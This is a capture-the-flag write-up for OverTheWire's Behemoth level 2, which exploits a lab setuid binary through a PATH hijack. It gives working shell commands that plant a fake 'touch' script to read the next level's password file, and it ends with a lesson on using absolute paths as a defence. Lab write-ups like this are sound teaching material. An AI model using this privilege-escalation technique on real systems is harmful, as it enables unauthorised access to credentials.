# OverTheWire — Behemoth Level 2 → 3

> Goal: Get behemoth3 password from `behemoth2`. Result: **`**********`** (hidden)
> Technique: **PATH hijack** — `system("touch %d")` uses a relative command name → fake `touch`.

---

## 1. Connection
```bash
ssh behemoth2@behemoth.labs.overthewire.org -p 2221
```

## 2. Vulnerability — disasm + rodata
```c
pid = getpid();
sprintf(buf, "touch %d", pid);      // fmt @0x804a008 = "touch %d"
lstat(buf+6, &st);                  // lstat("<pid>")
...
setreuid(geteuid(), geteuid());     // euid = behemoth3
system(buf);                        // system("touch <pid>")   <<< PATH hijack!
sleep(2000);
```
`system("touch <pid>")` → `/bin/sh -c "touch <pid>"` → `touch` is found **via PATH**.
Because the program calls `setreuid(behemoth3)`, `system` runs **as behemoth3**.

## 3. Exploit
Put a malicious `touch` script at the front of PATH:
```bash
W=$(mktemp -d); chmod 755 "$W"; cd "$W"
printf '#!/bin/sh\ncat /etc/behemoth_pass/behemoth3\n' > touch
chmod 755 touch
PATH="$W:$PATH" timeout 3 /behemoth/behemoth2      # fake touch runs as behemoth3 -> password
```
> The `touch` script runs as behemoth3 and prints the password. (The program then enters
> `sleep(2000)`; `timeout 3` kills it — the password is printed during `system`, BEFORE sleep.)


## Lessons
| Topic | Note |
|-------|------|
| PATH hijack | `system`/`execlp` with relative command name (`touch`) → you control PATH |
| setreuid + system | The command runs with the suid program's euid (behemoth3) |
| Use absolute paths (defense) | `system("/bin/touch ...")` would not be hijackable |
